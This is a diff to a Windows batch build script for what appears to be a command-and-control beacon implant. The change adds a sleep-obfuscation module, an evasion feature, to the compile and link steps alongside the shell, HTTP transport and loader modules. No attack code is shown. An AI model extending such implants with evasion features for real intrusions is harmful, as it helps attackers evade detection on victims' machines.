@@ -127,6 +127,10 @@ echo   modules\shell.c
 x86_64-w64-mingw32-gcc %COMMON_FLAGS% src\modules\shell.c -o "%OBJ_MODULES%\shell.obj"
 if !errorlevel! neq 0 (echo [!] Failed: modules\shell.c && exit /b 1)
 
+echo   modules\sleep_obf.c
+x86_64-w64-mingw32-gcc %COMMON_FLAGS% src\modules\sleep_obf.c -o "%OBJ_MODULES%\sleep_obf.obj"
+if !errorlevel! neq 0 (echo [!] Failed: modules\sleep_obf.c && exit /b 1)
+
 echo   core\beacon.c
 x86_64-w64-mingw32-gcc %COMMON_FLAGS% src\core\beacon.c -o "%OBJ_CORE%\beacon.obj"
 if !errorlevel! neq 0 (echo [!] Failed: core\beacon.c && exit /b 1)
@@ -172,6 +176,7 @@ x86_64-w64-mingw32-gcc %LINK_FLAGS% ^
   "%OBJ_CRYPTO%\ecdh.obj" ^
   "%OBJ_TRANSPORT%\http.obj" ^
   "%OBJ_MODULES%\shell.obj" ^
+  "%OBJ_MODULES%\sleep_obf.obj" ^
   "%OBJ_CORE%\beacon.obj" ^
   "%OBJ_CORE%\package.obj" ^
   "%OBJ_LOADER%\beacon_compatibility.obj" ^
